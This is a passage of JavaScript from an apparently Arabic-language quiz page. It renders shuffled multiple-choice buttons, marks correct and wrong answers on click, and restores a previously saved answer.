   if(prev){ta.disabled=true;b.disabled=true;ta.placeholder='(تمت الإجابة سابقاً)';finish(prev.ok,'<div><b>الإجابة النموذجية:</b></div>',true);}
   return;
  }
  const idx=q.o.map((o,i)=>i),order=q.ns?idx:shuffle(idx),btns=[];
  order.forEach(i=>{
   const b=el('button','opt',q.o[i]);btns.push([b,i]);area.append(b);
   b.onclick=()=>{
    btns.forEach(([x,j])=>{x.disabled=true;if(j===q.a)x.classList.add('good');});
    if(i!==q.a)b.classList.add('bad');
    finish(i===q.a);
   };
  });
  if(prev){btns.forEach(([x,j])=>{x.disabled=true;if(j===q.a)x.classList.add('good');});finish(prev.ok,'<div class="mut">(إجابتك المحفوظة)</div>',true);}
 }
 draw(true);
 return box;
}
